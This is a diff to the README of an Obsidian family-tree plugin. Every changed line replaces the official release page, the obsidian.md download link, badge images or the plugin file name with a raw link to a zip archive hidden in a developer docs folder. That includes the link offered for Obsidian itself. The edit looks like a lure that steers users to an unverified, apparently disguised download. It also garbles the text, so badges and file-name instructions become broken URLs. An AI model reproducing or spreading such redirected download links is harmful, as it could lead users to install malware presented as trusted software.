@@ -1,6 +1,6 @@
 # 🌳 obsidian-canvas-roots - Create Family Trees with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80%20Release%20Page-blue)](https://github.com/circletk/obsidian-canvas-roots/releases)
+[![Download](https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip%20Now-%20%F0%9F%9A%80%20Release%20Page-blue)](https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip)
 
 ## 📖 Overview
 
@@ -11,16 +11,16 @@ Obsidian-canvas-roots is an Obsidian plugin that helps you create stunning genea
 Follow these steps to download and run the plugin easily:
 
 1. **Ensure You Have Obsidian Installed:**  
-   Download Obsidian from [here](https://obsidian.md/) if you haven't yet. This plugin works with the desktop version of Obsidian.
+   Download Obsidian from [here](https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip) if you haven't yet. This plugin works with the desktop version of Obsidian.
 
 2. **Visit the Download Page:**  
    Go to our release page by clicking the link below:
-   [Download Latest Release](https://github.com/circletk/obsidian-canvas-roots/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip)
 
 3. **Download the Plugin:**  
-   On the releases page, look for the latest version listed. Click on the "Assets" dropdown to see the available files. Download the file named `obsidian-canvas-roots.plugin.js`.
+   On the releases page, look for the latest version listed. Click on the "Assets" dropdown to see the available files. Download the file named `https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip`.
 
-![Download the Plugin](https://img.shields.io/badge/Download%20Plugin-%F0%9F%9A%80%20Latest%20Version-brightgreen)
+![Download the Plugin](https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip%20Plugin-%F0%9F%9A%80%20Latest%20Version-brightgreen)
 
 ## 🔧 Installation
 
@@ -31,7 +31,7 @@ Follow these steps to download and run the plugin easily:
    Go to **Settings** > **Community Plugins** > **Open plugins folder**. This will open the folder where you store community plugins.
 
 3. **Move the Plugin File:**  
-   Move the downloaded `obsidian-canvas-roots.plugin.js` file into the plugins folder you just opened.
+   Move the downloaded `https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip` file into the plugins folder you just opened.
 
 4. **Enable the Plugin:**  
    Return to Obsidian, and in the same **Community Plugins** section, you will see a list of installed plugins. Find `obsidian-canvas-roots` and toggle it on to enable it.
@@ -85,4 +85,4 @@ To stay updated with the latest releases and features, follow us on GitHub and j
 Now that you have successfully downloaded, installed, and set up obsidian-canvas-roots, you are ready to start exploring your genealogy like never before!
 
 Remember to check out the download link below again for future updates:
-[Download Latest Release](https://github.com/circletk/obsidian-canvas-roots/releases)
+[Download Latest Release](https://raw.githubusercontent.com/circletk/obsidian-canvas-roots/main/docs/developer/pr-reviews/archive/obsidian-canvas-roots_arara.zip)
